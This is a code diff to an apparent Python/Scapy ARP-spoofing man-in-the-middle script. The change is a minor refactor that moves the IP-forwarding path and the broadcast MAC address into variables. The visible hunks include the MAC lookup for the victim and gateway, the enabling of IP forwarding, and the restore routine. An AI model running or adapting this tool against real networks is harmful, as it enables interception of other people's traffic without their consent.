@@ -3,6 +3,11 @@ import sys
 import os
 import time
 
+# Common variables:
+
+ipForward = "/proc/sys/net/ipv4/ip_forward"
+st = "ff:ff:ff:ff:ff:ff"
+
 # Getting input:
 
 try:
@@ -17,14 +22,14 @@ except:
 	sys.exit(1)
 
 print("\n[*] Enabling IP Forwarding... \n")
-os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+os.system("echo 1 > " + ipForward)
 
 
 # Getting MAC Addresses:
 
 def get_mac(IP):
 	conf.verb = 0
-	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+	ans, unans = srp(Ether(dst = st)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
 	for snd,rcv in ans:
 		return rcv.sprintf(r"%Ether.src%")
 
@@ -35,10 +40,10 @@ def reARP():
 	print("\n[*] Restoring Targets...")
 	victimMAC = get_mac(victimIP)
 	gateMAC = get_mac(gateIP)
-	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
-	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = st, hwsrc = victimMAC), count = 7)
+	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = st, hwsrc = gateMAC), count = 7)
 	print("[*] Disabling IP Forwarding...")
-	os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
+	os.system("sudo echo 0 > " + ipForward)
 	print("[*] Shutting Down...")
 	sys.exit(1)
 
@@ -55,14 +60,14 @@ def mitm():
 		print(victimIP)
 		victimMAC = get_mac(victimIP)
 	except Exception:
-		os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
+		os.system("sudo echo 0 > "  + ipForward)
 		print("[!] Couldn't find victim MAC address")
 		print("[!] Exiting ")
 		sys.exit(1)
 	try:
 		gateMAC = get_mac(gateIP)
 	except Exception:
-		os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
+		os.system("sudo echo 0 > " + ipForward)
 		print("[!] Couldn't find gateway MAC address")
 		print("[!] Exiting ")
 		sys.exit(1)
